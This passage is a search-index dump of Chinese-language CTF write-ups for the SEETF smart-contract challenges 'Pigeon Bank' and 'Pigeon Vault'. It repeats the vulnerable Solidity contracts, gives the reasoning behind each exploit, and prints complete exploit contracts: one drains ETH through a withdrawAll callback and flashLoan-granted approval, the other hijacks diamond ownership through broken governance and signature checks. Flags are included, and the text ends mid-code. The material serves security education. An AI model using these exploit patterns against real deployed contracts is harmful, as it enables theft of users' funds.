(); // @dev - Deposit 2500 ETH to PigeonBank pigeonBank . deposit { value : msg . value }(); assert ( address ( pigeonBank ). balance == 0 ether ); assert ( peth . balanceOf ( address ( this )) == 2500 ether ); } function isSolved () external view returns ( bool ) { return ( peth . totalSupply () == 0 ) && ( address ( msg . sender ). balance >= 2500 ether ); } } PigeonBank.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 // SPDX-License-Identifier: UNLICENSED pragma solidity ^ 0.8.17 ; import \"@openzeppelin/contracts/security/ReentrancyGuard.sol\" ; import \"@openzeppelin/contracts/utils/Address.sol\" ; import \"./PETH.sol\" ; // Deposit Ether to PigeonBank to get PETH // @TODO: Implement interest rate feature so that users can get interest by depositing Ether contract PigeonBank is ReentrancyGuard { using Address for address payable ; using Address for address ; PETH public immutable peth ; // @dev - Created by the SEE team. Pigeon Bank is created to allow citizens to deposit Ether and get SEETH and earn interest to survive the economic crisis. address private _owner ; constructor () { peth = new PETH (); _owner = msg . sender ; } function deposit () public payable nonReentrant { peth . deposit { value : msg . value }( msg . sender ); } function withdraw ( uint256 wad ) public nonReentrant { peth . withdraw ( msg . sender , wad ); } function withdrawAll () public nonReentrant { peth . withdrawAll ( msg . sender ); } function flashLoan ( address receiver , bytes calldata data , uint256 wad ) public nonReentrant { peth . flashLoan ( receiver , wad , data ); } receive () external payable {} } PETH.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 // SPDX-License-Identifier: UNLICENSED pragma solidity ^ 0.8.17 ; import \"@openzeppelin/contracts/access/Ownable.sol\" ; import \"@openzeppelin/contracts/utils/Address.sol\" ; contract PETH is Ownable { using Address for address ; using Address for address payable ; string public constant name = \"Pigeon ETH\" ; string public constant symbol = \"PETH\" ; uint8 public constant decimals = 18 ; event Approval ( address indexed src , address indexed dst , uint256 amt ); event Transfer ( address indexed src , address indexed dst , uint256 amt ); event Deposit ( address indexed dst , uint256 amt ); event Withdrawal ( address indexed src , uint256 amt ); mapping ( address => uint256 ) public balanceOf ; mapping ( address => mapping ( address => uint256 )) public allowance ; receive () external payable { revert ( \"PETH: Do not send ETH directly\" ); } function deposit ( address _userAddress ) public payable onlyOwner { _mint ( _userAddress , msg . value ); emit Deposit ( _userAddress , msg . value ); // return msg.value; } function withdraw ( address _userAddress , uint256 _wad ) public onlyOwner { payable ( _userAddress ). sendValue ( _wad ); _burn ( _userAddress , _wad ); // require(success, \"SEETH: withdraw failed\"); emit Withdrawal ( _userAddress , _wad ); } function withdrawAll ( address _userAddress ) public onlyOwner { payable ( _userAddress ). sendValue ( balanceOf [ _userAddress ]); _burnAll ( _userAddress ); // require(success, \"SEETH: withdraw failed\"); emit Withdrawal ( _userAddress , balanceOf [ _userAddress ]); } function totalSupply () public view returns ( uint256 ) { return address ( this ). balance ; } function approve ( address guy , uint256 wad ) public returns ( bool ) { allowance [ msg . sender ][ guy ] = wad ; emit Approval ( msg . sender , guy , wad ); return true ; } function transfer ( address dst , uint256 wad ) public returns ( bool ) { return transferFrom ( msg . sender , dst , wad ); } function transferFrom ( address src , address dst , uint256 wad ) public returns ( bool ) { require ( balanceOf [ src ] >= wad ); if ( src != msg . sender && allowance [ src ][ msg . sender ] != type ( uint256 ). max ) { require ( allowance [ src ][ msg . sender ] >= wad ); allowance [ src ][ msg . sender ] -= wad ; } balanceOf [ src ] -= wad ; balanceOf [ dst ] += wad ; emit Transfer ( src , dst , wad ); return true ; } function flashLoan ( address _userAddress , uint256 _wad , bytes calldata data ) public onlyOwner { require ( _wad <= address ( this ). balance , \"PETH: wad exceeds balance\" ); require ( Address . isContract ( _userAddress ), \"PETH: Borrower must be a contract\" ); uint256 userBalanceBefore = address ( this ). balance ; // @dev Send Ether to borrower (Borrower must implement receive() function) Address . functionCallWithValue ( _userAddress , data , _wad ); uint256 userBalanceAfter = address ( this ). balance ; require ( userBalanceAfter >= userBalanceBefore , \"PETH: You did not return my Ether!\" ); // @dev if user gave me more Ether, refund it if ( userBalanceAfter > userBalanceBefore ) { uint256 refund = userBalanceAfter - userBalanceBefore ; payable ( _userAddress ). sendValue ( refund ); } } // ========== INTERNAL FUNCTION ========== function _mint ( address dst , uint256 wad ) internal { balanceOf [ dst ] += wad ; } function _burn ( address src , uint256 wad ) internal { require ( balanceOf [ src ] >= wad ); balanceOf [ src ] -= wad ; } function _burnAll ( address _userAddress ) internal { _burn ( _userAddress , balanceOf [ _userAddress ]); } } \u89e3\u9898\u601d\u8def \u00b6 \u521d\u59cb\uff0c Setup \u5408\u7ea6\u5411 PETH deposit \u4e86 2500 ether\uff0c\u76ee\u6807\u662f\u6e05\u7a7a PETH \u5185\u7684\u5b58\u6b3e \u9700\u8981\u901a\u8fc7 PigeonBank \u8c03\u7528 PETH \u7684\u51fd\u6570\uff0c\u53ef\u8c03\u7528\u7684\u51fd\u6570\u5305\u62ec deposit() \u3001 withdraw() \u3001 withdrawAll() \u548c flashLoan() \u9996\u5148\u5173\u6ce8 flashLoan() \uff0c\u7531\u4e8e\u4e0d\u80fd\u76f4\u63a5\u5411 PETH \u53d1\u9001 ETH\uff0c\u8981\u4e48\u6bcf\u6b21\u501f\u8d37\u91d1\u989d\u4e3a 0\uff0c\u8981\u4e48\u4f7f\u7528 selfdestruct \u8fd4\u8fd8\u7ed9 PETH \uff0c\u4f46\u90fd\u4e0d\u5177\u5907\u592a\u5927\u7684\u4ef7\u503c 1 2 3 receive () external payable { revert ( \"PETH: Do not send ETH directly\" ); } \u4e0d\u8fc7\uff0c PETH.flashLoan() \u4f7f\u7528\u4e86 Address.functionCallWithValue() \uff0c\u5373\u53ef\u4ee5\u8ba9 PETH \u7684\u5b9e\u4f8b\u8c03\u7528\u4efb\u4f55\u51fd\u6570 :D \u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c\u5728 withdrawAll() \u4e2d\uff0c\u9996\u5148\u5411 _userAddress \u53d1\u9001\u5176\u5f53\u524d\u4f59\u989d\u5bf9\u5e94\u6570\u91cf\u7684 ETH\uff0c\u968f\u540e\u6839\u636e _userAddress \u7684\u5f53\u524d\u4f59\u989d\u9500\u6bc1\u4ee3\u5e01\uff0c\u90a3\u4e48\u53ef\u4ee5\u5728\u56de\u8c03\u51fd\u6570\u4e2d\u5c06\u4ee3\u5e01 transfer \u5230\u53d7\u63a7\u5730\u5740\uff08\u53ef\u4ee5\u662f PETH \u5b9e\u4f8b\uff0c\u4f7f\u7528 flashLoan() \u8c03\u7528 approve \uff09\uff0c\u4ece\u800c\u9010\u6b65\u8f6c\u79fb PETH \u6301\u6709\u7684 ETH > < 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 function withdrawAll ( address _userAddress ) public onlyOwner { payable ( _userAddress ). sendValue ( balanceOf [ _userAddress ]); _burnAll ( _userAddress ); // require(success, \"SEETH: withdraw failed\"); emit Withdrawal ( _userAddress , balanceOf [ _userAddress ]); } function _burn ( address src , uint256 wad ) internal { require ( balanceOf [ src ] >= wad ); balanceOf [ src ] -= wad ; } function _burnAll ( address _userAddress ) internal { _burn ( _userAddress , balanceOf [ _userAddress ]); } Exploit \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 pragma solidity 0.8.17 ; interface IPigeonBank { function peth () external view returns ( IPETH ); function deposit () external payable ; function withdraw ( uint256 wad ) external ; function withdrawAll () external ; function flashLoan ( address receiver , bytes calldata data , uint256 wad ) external ; } interface IPETH { function approve ( address guy , uint256 wad ) external returns ( bool ); function transfer ( address dst , uint256 wad ) external returns ( bool ); function transferFrom ( address src , address dst , uint256 wad ) external returns ( bool ); } contract Hack { IPigeonBank bank ; IPETH peth ; bool onWithdraw ; function exploit ( address payable instance ) external payable { bank = IPigeonBank ( instance ); peth = bank . peth (); bank . flashLoan ( address ( peth ), abi . encodeWithSignature ( \"approve(address,uint256)\" , address ( this ), type ( uint256 ). max ), 0 ); uint amount ; while ( address ( peth ). balance != 0 ) { amount = address ( this ). balance < address ( peth ). balance ? address ( this ). balance : address ( peth ). balance ; bank . deposit { value : amount }(); onWithdraw = true ; bank . withdrawAll (); onWithdraw = false ; peth . transferFrom ( address ( peth ), address ( this ), amount ); bank . withdrawAll (); } selfdestruct ( payable ( msg . sender )); } fallback () external payable { if ( onWithdraw ) { peth . transfer ( address ( peth ), msg . value ); } } } Flag \u00b6 SEE{N0t_4n0th3r_r33ntr4ncY_4tt4ck_abb0acf50139ba1e468f363f96bc5a24}","title":"Pigeon Bank"},{"location":"blockchain/pigeon_bank/#_1","text":"The new era is coming. Pigeons are invading and in order to survive, the SEE Team created PigeonBank so that people can get extremely high interest rate. Hold PETH to get high interest. PETH is strictly controlled by the SEE team to prevent manipulation and corruption. nc win.the.seetf.sg 8550 Setup.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 // SPDX-License-Identifier: UNLICENSED pragma solidity ^ 0.8.17 ; import \"./PETH.sol\" ; import \"./PigeonBank.sol\" ; contract Setup { PETH public immutable peth ; PigeonBank public immutable pigeonBank ; // @dev - The SEE Team provided 2500 ETH to PigeonBank to provide liquidity so that the bank stays solvent. constructor () payable { require ( msg . value == 2500 ether , \"Setup: msg.value must be 2500 ether\" ); pigeonBank = new PigeonBank (); peth = pigeonBank . peth (); // @dev - Deposit 2500 ETH to PigeonBank pigeonBank . deposit { value : msg . value }(); assert ( address ( pigeonBank ). balance == 0 ether ); assert ( peth . balanceOf ( address ( this )) == 2500 ether ); } function isSolved () external view returns ( bool ) { return ( peth . totalSupply () == 0 ) && ( address ( msg . sender ). balance >= 2500 ether ); } } PigeonBank.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 // SPDX-License-Identifier: UNLICENSED pragma solidity ^ 0.8.17 ; import \"@openzeppelin/contracts/security/ReentrancyGuard.sol\" ; import \"@openzeppelin/contracts/utils/Address.sol\" ; import \"./PETH.sol\" ; // Deposit Ether to PigeonBank to get PETH // @TODO: Implement interest rate feature so that users can get interest by depositing Ether contract PigeonBank is ReentrancyGuard { using Address for address payable ; using Address for address ; PETH public immutable peth ; // @dev - Created by the SEE team. Pigeon Bank is created to allow citizens to deposit Ether and get SEETH and earn interest to survive the economic crisis. address private _owner ; constructor () { peth = new PETH (); _owner = msg . sender ; } function deposit () public payable nonReentrant { peth . deposit { value : msg . value }( msg . sender ); } function withdraw ( uint256 wad ) public nonReentrant { peth . withdraw ( msg . sender , wad ); } function withdrawAll () public nonReentrant { peth . withdrawAll ( msg . sender ); } function flashLoan ( address receiver , bytes calldata data , uint256 wad ) public nonReentrant { peth . flashLoan ( receiver , wad , data ); } receive () external payable {} } PETH.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 // SPDX-License-Identifier: UNLICENSED pragma solidity ^ 0.8.17 ; import \"@openzeppelin/contracts/access/Ownable.sol\" ; import \"@openzeppelin/contracts/utils/Address.sol\" ; contract PETH is Ownable { using Address for address ; using Address for address payable ; string public constant name = \"Pigeon ETH\" ; string public constant symbol = \"PETH\" ; uint8 public constant decimals = 18 ; event Approval ( address indexed src , address indexed dst , uint256 amt ); event Transfer ( address indexed src , address indexed dst , uint256 amt ); event Deposit ( address indexed dst , uint256 amt ); event Withdrawal ( address indexed src , uint256 amt ); mapping ( address => uint256 ) public balanceOf ; mapping ( address => mapping ( address => uint256 )) public allowance ; receive () external payable { revert ( \"PETH: Do not send ETH directly\" ); } function deposit ( address _userAddress ) public payable onlyOwner { _mint ( _userAddress , msg . value ); emit Deposit ( _userAddress , msg . value ); // return msg.value; } function withdraw ( address _userAddress , uint256 _wad ) public onlyOwner { payable ( _userAddress ). sendValue ( _wad ); _burn ( _userAddress , _wad ); // require(success, \"SEETH: withdraw failed\"); emit Withdrawal ( _userAddress , _wad ); } function withdrawAll ( address _userAddress ) public onlyOwner { payable ( _userAddress ). sendValue ( balanceOf [ _userAddress ]); _burnAll ( _userAddress ); // require(success, \"SEETH: withdraw failed\"); emit Withdrawal ( _userAddress , balanceOf [ _userAddress ]); } function totalSupply () public view returns ( uint256 ) { return address ( this ). balance ; } function approve ( address guy , uint256 wad ) public returns ( bool ) { allowance [ msg . sender ][ guy ] = wad ; emit Approval ( msg . sender , guy , wad ); return true ; } function transfer ( address dst , uint256 wad ) public returns ( bool ) { return transferFrom ( msg . sender , dst , wad ); } function transferFrom ( address src , address dst , uint256 wad ) public returns ( bool ) { require ( balanceOf [ src ] >= wad ); if ( src != msg . sender && allowance [ src ][ msg . sender ] != type ( uint256 ). max ) { require ( allowance [ src ][ msg . sender ] >= wad ); allowance [ src ][ msg . sender ] -= wad ; } balanceOf [ src ] -= wad ; balanceOf [ dst ] += wad ; emit Transfer ( src , dst , wad ); return true ; } function flashLoan ( address _userAddress , uint256 _wad , bytes calldata data ) public onlyOwner { require ( _wad <= address ( this ). balance , \"PETH: wad exceeds balance\" ); require ( Address . isContract ( _userAddress ), \"PETH: Borrower must be a contract\" ); uint256 userBalanceBefore = address ( this ). balance ; // @dev Send Ether to borrower (Borrower must implement receive() function) Address . functionCallWithValue ( _userAddress , data , _wad ); uint256 userBalanceAfter = address ( this ). balance ; require ( userBalanceAfter >= userBalanceBefore , \"PETH: You did not return my Ether!\" ); // @dev if user gave me more Ether, refund it if ( userBalanceAfter > userBalanceBefore ) { uint256 refund = userBalanceAfter - userBalanceBefore ; payable ( _userAddress ). sendValue ( refund ); } } // ========== INTERNAL FUNCTION ========== function _mint ( address dst , uint256 wad ) internal { balanceOf [ dst ] += wad ; } function _burn ( address src , uint256 wad ) internal { require ( balanceOf [ src ] >= wad ); balanceOf [ src ] -= wad ; } function _burnAll ( address _userAddress ) internal { _burn ( _userAddress , balanceOf [ _userAddress ]); } }","title":"\u9898\u76ee"},{"location":"blockchain/pigeon_bank/#_2","text":"\u521d\u59cb\uff0c Setup \u5408\u7ea6\u5411 PETH deposit \u4e86 2500 ether\uff0c\u76ee\u6807\u662f\u6e05\u7a7a PETH \u5185\u7684\u5b58\u6b3e \u9700\u8981\u901a\u8fc7 PigeonBank \u8c03\u7528 PETH \u7684\u51fd\u6570\uff0c\u53ef\u8c03\u7528\u7684\u51fd\u6570\u5305\u62ec deposit() \u3001 withdraw() \u3001 withdrawAll() \u548c flashLoan() \u9996\u5148\u5173\u6ce8 flashLoan() \uff0c\u7531\u4e8e\u4e0d\u80fd\u76f4\u63a5\u5411 PETH \u53d1\u9001 ETH\uff0c\u8981\u4e48\u6bcf\u6b21\u501f\u8d37\u91d1\u989d\u4e3a 0\uff0c\u8981\u4e48\u4f7f\u7528 selfdestruct \u8fd4\u8fd8\u7ed9 PETH \uff0c\u4f46\u90fd\u4e0d\u5177\u5907\u592a\u5927\u7684\u4ef7\u503c 1 2 3 receive () external payable { revert ( \"PETH: Do not send ETH directly\" ); } \u4e0d\u8fc7\uff0c PETH.flashLoan() \u4f7f\u7528\u4e86 Address.functionCallWithValue() \uff0c\u5373\u53ef\u4ee5\u8ba9 PETH \u7684\u5b9e\u4f8b\u8c03\u7528\u4efb\u4f55\u51fd\u6570 :D \u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c\u5728 withdrawAll() \u4e2d\uff0c\u9996\u5148\u5411 _userAddress \u53d1\u9001\u5176\u5f53\u524d\u4f59\u989d\u5bf9\u5e94\u6570\u91cf\u7684 ETH\uff0c\u968f\u540e\u6839\u636e _userAddress \u7684\u5f53\u524d\u4f59\u989d\u9500\u6bc1\u4ee3\u5e01\uff0c\u90a3\u4e48\u53ef\u4ee5\u5728\u56de\u8c03\u51fd\u6570\u4e2d\u5c06\u4ee3\u5e01 transfer \u5230\u53d7\u63a7\u5730\u5740\uff08\u53ef\u4ee5\u662f PETH \u5b9e\u4f8b\uff0c\u4f7f\u7528 flashLoan() \u8c03\u7528 approve \uff09\uff0c\u4ece\u800c\u9010\u6b65\u8f6c\u79fb PETH \u6301\u6709\u7684 ETH > < 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 function withdrawAll ( address _userAddress ) public onlyOwner { payable ( _userAddress ). sendValue ( balanceOf [ _userAddress ]); _burnAll ( _userAddress ); // require(success, \"SEETH: withdraw failed\"); emit Withdrawal ( _userAddress , balanceOf [ _userAddress ]); } function _burn ( address src , uint256 wad ) internal { require ( balanceOf [ src ] >= wad ); balanceOf [ src ] -= wad ; } function _burnAll ( address _userAddress ) internal { _burn ( _userAddress , balanceOf [ _userAddress ]); }","title":"\u89e3\u9898\u601d\u8def"},{"location":"blockchain/pigeon_bank/#exploit","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 pragma solidity 0.8.17 ; interface IPigeonBank { function peth () external view returns ( IPETH ); function deposit () external payable ; function withdraw ( uint256 wad ) external ; function withdrawAll () external ; function flashLoan ( address receiver , bytes calldata data , uint256 wad ) external ; } interface IPETH { function approve ( address guy , uint256 wad ) external returns ( bool ); function transfer ( address dst , uint256 wad ) external returns ( bool ); function transferFrom ( address src , address dst , uint256 wad ) external returns ( bool ); } contract Hack { IPigeonBank bank ; IPETH peth ; bool onWithdraw ; function exploit ( address payable instance ) external payable { bank = IPigeonBank ( instance ); peth = bank . peth (); bank . flashLoan ( address ( peth ), abi . encodeWithSignature ( \"approve(address,uint256)\" , address ( this ), type ( uint256 ). max ), 0 ); uint amount ; while ( address ( peth ). balance != 0 ) { amount = address ( this ). balance < address ( peth ). balance ? address ( this ). balance : address ( peth ). balance ; bank . deposit { value : amount }(); onWithdraw = true ; bank . withdrawAll (); onWithdraw = false ; peth . transferFrom ( address ( peth ), address ( this ), amount ); bank . withdrawAll (); } selfdestruct ( payable ( msg . sender )); } fallback () external payable { if ( onWithdraw ) { peth . transfer ( address ( peth ), msg . value ); } } }","title":"Exploit"},{"location":"blockchain/pigeon_bank/#flag","text":"SEE{N0t_4n0th3r_r33ntr4ncY_4tt4ck_abb0acf50139ba1e468f363f96bc5a24}","title":"Flag"},{"location":"blockchain/pigeon_vault/","tags":["smart contract","diamond","proxy","data validation","ecrecover"],"text":"#smart contract #diamond #proxy #data validation #ecrecover .md-typeset .blogging-tags-grid { display: flex; flex-direction: row; flex-wrap: wrap; gap: 8px; margin-top: 5px; } .md-typeset .blogging-tag { color: var(--md-typeset-color); background-color: var(--md-typeset-code-color); white-space: nowrap; display: block; } .md-typeset .blogging-tag code { border-radius: 5px; } \u9898\u76ee \u00b6 rainbowpigeon has just received a massive payout from his secret business, and he now wants to create a secure vault to store his cryptocurrency assets. To achieve this, he developed PigeonVault, and being a smart guy, he made provisions for upgrading the contract in case he detects any vulnerability in the system. Find out a way to steal his funds before he discovers any flaws in his implementation. Blockchain has a block time of 10: https://book.getfoundry.sh/reference/anvil/ nc win.the.seetf.sg 8552 pigeon_vault.zip \u89e3\u9898\u601d\u8def \u00b6 \u9700\u8981\u6210\u4e3a diamond \u5408\u7ea6\u7684\u6240\u6709\u8005\u4e14\u6301\u6709\u4e0d\u5c11\u4e8e 3000 ether (\u5373\u6e05\u7a7a pigeonDiamond \u7684\u4f59\u989d) 1 2 3 function isSolved () external view returns ( bool ) { return ( IOwnershipFacet ( address ( pigeonDiamond )). owner () == msg . sender && msg . sender . balance >= 3000 ether ); } PigeonDiamond \u91c7\u7528\u4e86 Diamond Storage \u548c App Storage \u6df7\u5408\u7684\u5b58\u50a8\u6a21\u5f0f \u5148\u4e86\u89e3\u4e00\u4e0b\u5e94\u7528\u5c42\u9762\u5207\u9762\u7684\u529f\u80fd DAOFacet submitProposal() \u7531\u4e8e isUserGovernance() \u9608\u503c\u8bbe\u7f6e\u5b58\u5728\u95ee\u9898\uff0c\u4efb\u610f\u7528\u6237\u53ef\u4ee5\u63d0\u4ea4\u64cd\u4f5c\u5207\u9762\u7684\u63d0\u6848 1 2 3 4 5 6 function isUserGovernance ( address _user ) internal view returns ( bool ) { uint256 totalSupply = s . totalSupply ; uint256 userBalance = LibDAO . getCurrentVotes ( _user ); uint256 threshold = ( userBalance * 100 ) / totalSupply ; return userBalance >= threshold ; // If userBalance equals 0, then the threshold is 0 and satisfies this condition } executeProposal() \u6267\u884c\u6307\u5b9a\u63d0\u6848 \u63d0\u6848\u7684 forVotes \u9700\u8981\u5927\u4e8e againstVotes \u4ee5\u53ca\u5341\u5206\u4e4b\u4e00\u7684 totalSupply castVoteBySig() \u9a8c\u8bc1\u7b7e\u540d\u5e76\u4e3a\u63d0\u6848\u6295\u7968 \u53ea\u68c0\u67e5 signer \u4e0d\u4e3a address(0) \uff0c\u56e0\u6b64\u53ef\u4ee5\u662f\u65e0\u6548\u7b7e\u540d \u7968\u6570\u4e3a msg.sender \uff08\u800c\u4e0d\u662f signer \uff09\u5728 proposal.startBlock \u524d\u6700\u540e\u4e00\u6b21\u8bb0\u5f55\u7684\u7968\u6570 FTCFacet FeatherCoin\uff0c\u4e0e Diamond Heist \u7c7b\u4f3c\u7684\u6a21\u5f0f OwnershipFacet \u4f7f\u7528 Diamond \u5b58\u50a8\u6a21\u5f0f\u7ba1\u7406 contractOwner PigeonVaultFacet emergencyWithdraw() owner \u53ef\u4ee5\u53d6\u51fa\u5408\u7ea6\u6240\u6709\u7684 ether \u53e6\u5916\uff0c\u5728 Setup \u4e2d\uff0c\u7531\u4e8e\u6ca1\u6709\u66f4\u65b0 claimed \uff0c\u4efb\u4f55\u4eba\u53ef\u4ee5\u8c03\u7528\u4efb\u610f\u6b21 claim() \u6765\u83b7\u5f97 FTC 1 2 3 4 5 6 function claim () external { require ( ! claimed , \"You already claimed\" ); bool success = IERC20 ( address ( pigeonDiamond )). transfer ( msg . sender , 10 _000 ether ); require ( success , \"Failed to send\" ); } \u6bd4\u8f83\u7b80\u5355\u76f4\u63a5\u7684\u65b9\u6cd5\u662f\u8c03\u7528 11 \u6b21 claim() \u6765\u83b7\u53d6\u8fbe\u5230\u6267\u884c\u63d0\u6848\u9608\u503c\u7684\u7968\u6570\uff0c\u4e5f\u53ef\u901a\u8fc7 castVoteBySig() \u8fdb\u884c\u591a\u6b21\u6295\u7968 Exploit \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 pragma solidity ^ 0.8.17 ; import \"forge-std/Test.sol\" ; import \"../src/Setup.sol\" ; import \"../src/libraries/LibDiamond.sol\" ; import \"../src/interfaces/IDAOFacet.sol\" ; interface IFTCFacet { function delegate ( address _delegatee ) external ; } contract HackFacet { function exploit ( address player ) external { LibDiamond . setContractOwner ( player ); payable ( player ). transfer ( address ( this ). balance ); } } contract SolveTest is Test { Setup setup ; address pigeonDiamond ; uint constant privKey = 0xdead ; address immutable hacker = vm . addr ( privKey ); function setUp () public { setup = new Setup { value : 3000 ether }(); pigeonDiamond = address ( setup . pigeonDiamond ()); } function testSolve () public { vm . startPrank ( hacker ); address hackFacet = address ( new HackFacet ()); bytes4 [] memory selectors = new bytes4 []( 1 ); selectors [ 0 ] = bytes4 ( keccak256 ( \"exploit()\" )); IDiamondCut . FacetCut memory diamondCut = IDiamondCut . FacetCut ({ facetAddress : hackFacet , action : IDiamondCut . FacetCutAction . Add , functionSelectors : selectors }); IFTCFacet ( pigeonDiamond ). delegate ( hacker ); for ( uint8 i ; i < 11 ; ++ i ) { setup . claim (); } uint proposalId = IDAOFacet ( pigeonDiamond ). submitProposal ( hackFacet , abi . encodeWithSignature ( \"exploit(address)\" , hacker ), diamondCut ); ( uint8 v , bytes32 r , bytes32 s ) = vm . sign ( privKey , keccak256 ( \"\\x19Ethereum Signed Message:\\n32\" )); bytes memory signature = abi . encodePacked ( r , s , v ); vm . roll ( 2 ); IDAOFacet ( pigeonDiamond ). castVoteBySig ( proposalId , true , signature ); vm . roll ( 10 ); IDAOFacet ( pigeonDiamond ). executeProposal ( proposalId ); assert ( setup . isSolved ()); vm . stopPrank (); } } Flag \u00b6 SEE{D14m0nd5_st0rAg3_4nd_P1g30nS_d0n\u2019t_g0_w311_t0G37h3r_B1lnG_bl1ng_bed2cbc16cbfca78f6e7d73ae2ac987f}","title":"Pigeon Vault"},{"location":"blockchain/pigeon_vault/#_1","text":"rainbowpigeon has just received a massive payout from his secret business, and he now wants to create a secure vault to store his cryptocurrency assets. To achieve this, he developed PigeonVault, and being a smart guy, he made provisions for upgrading the contract in case he detects any vulnerability in the system. Find out a way to steal his funds before he discovers any flaws in his implementation. Blockchain has a block time of 10: https://book.getfoundry.sh/reference/anvil/ nc win.the.seetf.sg 8552 pigeon_vault.zip","title":"\u9898\u76ee"},{"location":"blockchain/pigeon_vault/#_2","text":"\u9700\u8981\u6210\u4e3a diamond \u5408\u7ea6\u7684\u6240\u6709\u8005\u4e14\u6301\u6709\u4e0d\u5c11\u4e8e 3000 ether (\u5373\u6e05\u7a7a pigeonDiamond \u7684\u4f59\u989d) 1 2 3 function isSolved () external view returns ( bool ) { return ( IOwnershipFacet ( address ( pigeonDiamond )). owner () == msg . sender && msg . sender . balance >= 3000 ether ); } PigeonDiamond \u91c7\u7528\u4e86 Diamond Storage \u548c App Storage \u6df7\u5408\u7684\u5b58\u50a8\u6a21\u5f0f \u5148\u4e86\u89e3\u4e00\u4e0b\u5e94\u7528\u5c42\u9762\u5207\u9762\u7684\u529f\u80fd DAOFacet submitProposal() \u7531\u4e8e isUserGovernance() \u9608\u503c\u8bbe\u7f6e\u5b58\u5728\u95ee\u9898\uff0c\u4efb\u610f\u7528\u6237\u53ef\u4ee5\u63d0\u4ea4\u64cd\u4f5c\u5207\u9762\u7684\u63d0\u6848 1 2 3 4 5 6 function isUserGovernance ( address _user ) internal view returns ( bool ) { uint256 totalSupply = s . totalSupply ; uint256 userBalance = LibDAO . getCurrentVotes ( _user ); uint256 threshold = ( userBalance * 100 ) / totalSupply ; return userBalance >= threshold ; // If userBalance equals 0, then the threshold is 0 and satisfies this condition } executeProposal() \u6267\u884c\u6307\u5b9a\u63d0\u6848 \u63d0\u6848\u7684 forVotes \u9700\u8981\u5927\u4e8e againstVotes \u4ee5\u53ca\u5341\u5206\u4e4b\u4e00\u7684 totalSupply castVoteBySig() \u9a8c\u8bc1\u7b7e\u540d\u5e76\u4e3a\u63d0\u6848\u6295\u7968 \u53ea\u68c0\u67e5 signer \u4e0d\u4e3a address(0) \uff0c\u56e0\u6b64\u53ef\u4ee5\u662f\u65e0\u6548\u7b7e\u540d \u7968\u6570\u4e3a msg.sender \uff08\u800c\u4e0d\u662f signer \uff09\u5728 proposal.startBlock \u524d\u6700\u540e\u4e00\u6b21\u8bb0\u5f55\u7684\u7968\u6570 FTCFacet FeatherCoin\uff0c\u4e0e Diamond Heist \u7c7b\u4f3c\u7684\u6a21\u5f0f OwnershipFacet \u4f7f\u7528 Diamond \u5b58\u50a8\u6a21\u5f0f\u7ba1\u7406 contractOwner PigeonVaultFacet emergencyWithdraw() owner \u53ef\u4ee5\u53d6\u51fa\u5408\u7ea6\u6240\u6709\u7684 ether \u53e6\u5916\uff0c\u5728 Setup \u4e2d\uff0c\u7531\u4e8e\u6ca1\u6709\u66f4\u65b0 claimed \uff0c\u4efb\u4f55\u4eba\u53ef\u4ee5\u8c03\u7528\u4efb\u610f\u6b21 claim() \u6765\u83b7\u5f97 FTC 1 2 3 4 5 6 function claim () external { require ( ! claimed , \"You already claimed\" ); bool success = IERC20 ( address ( pigeonDiamond )). transfer ( msg . sender , 10 _000 ether ); require ( success , \"Failed to send\" ); } \u6bd4\u8f83\u7b80\u5355\u76f4\u63a5\u7684\u65b9\u6cd5\u662f\u8c03\u7528 11 \u6b21 claim() \u6765\u83b7\u53d6\u8fbe\u5230\u6267\u884c\u63d0\u6848\u9608\u503c\u7684\u7968\u6570\uff0c\u4e5f\u53ef\u901a\u8fc7 castVoteBySig() \u8fdb\u884c\u591a\u6b21\u6295\u7968","title":"\u89e3\u9898\u601d\u8def"},{"location":"blockchain/pigeon_vault/#exploit","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 pragma solidity ^ 0.8.17 ; import \"forge-std/Test.sol\" ; import \"../src/Setup.sol\" ; import \"../src/libraries/LibDiamond.sol\" ; import \"../src/interfaces/IDAOFacet.sol\" ; interface IFTCFacet { function delegate ( address _delegatee ) external ; } contract HackFacet { function exploit ( address player ) external { LibDiamond . setContractOwner ( player 